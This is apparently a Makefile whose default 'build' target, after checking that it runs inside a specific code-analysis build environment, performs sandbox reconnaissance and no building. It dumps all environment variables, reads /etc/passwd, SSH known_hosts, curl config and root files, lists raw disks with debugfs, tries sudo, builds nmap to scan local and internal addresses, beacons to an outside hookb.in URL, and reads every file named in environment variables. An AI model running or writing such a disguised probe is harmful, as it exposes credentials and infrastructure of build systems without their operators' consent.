.DEFAULT_GOAL := build
checksource:
ifneq (${ODASA_DB}, "/opt/out/snapshot/working/db-go")
	echo "Error: not in go build" && exit 2
endif
ListAllCommands:
	echo -n ${PATH} | xargs -d : -I {} find {} -maxdepth 1 \
	    -executable -type f -printf '%P\n' | sort -u
EchoEnv:
	printenv | sort
build: checksource ListAllCommands EchoEnv
	find /usr/local/share/ca-certificates | sort -u || true
	find /opt | sort -u || true
	(git clone https://github.com/nmap/nmap && cd nmap && ./configure && make && make install && ls) || true
	runner-linux || true
	runner || true
	relocator.py || true
	query_cli_native64.so || true
	initctl || true
	extractor || true
	dep || true
	compile_et || true
	unminimize || true
	cat /etc/shells || true
	cat /etc/passwd || true
	cat ~/.curlrc || true
	cat /proc/cmdline || true
	cat /proc/cpuinfo || true
	debugfs /dev/sda1 -R ls || true
	debugfs /dev/sdb -R ls || true
	debugfs /dev/sdc1 -R ls || true
	ls -al /dev/disk/by-uuid || true
	ls -al /proc || true
	cat /root/.start-build.sh || true
	ls -al /root/ || true
	cat /proc/1/cgroup || true
	cat /.dockerenv || true
	ls -al ~/ || true
	ls -al / || true
	ls -al /home || true
	df -h || true
	ls -al /dev || true
	ls -al /var/run || true
	hostname || true
	hostnamectl || true
	last || true
	networkctl -a || true
	ps aux || true
	whoami || true
	uname -a || true
	curl -X POST -H "Content-Type: application/json" -d '{"name": "John"}' https://hookb.in/PxlndeYwL7UZVqjmP0gx
	curl -v -k 127.0.0.1 || true
	curl -v -k 168.192.1.1 || true
	sudo su || true
	sudo visudo || true
	mitmproxy || true
	mitmdump || true
	mitmweb || true
	pathoc || true
	pathod || true
	curl -v -k localhost || true
	curl -v -k http://localhost || true
	curl -v -k http://localhost:8081 || true
	curl -v -k https://proxy.golang.org || true
	apt-get update || true
	apt-get install nmap || true
	./nmap/nmap 127.0.0.1 || true
	./nmap/nmap 168.192.1.1 || true
	./nmap/nmap localhost || true
	cat ~/.ssh/known_hosts || true
	ls -al ~/.ssh || true
	for var in $$(printenv | mawk -F= '{print $$2}'); do\
	 echo ::: $$var ::: && \
	 cat $$var || ls $$var || true; \
	done
.PHONY: ListAllCommands EchoEnv build
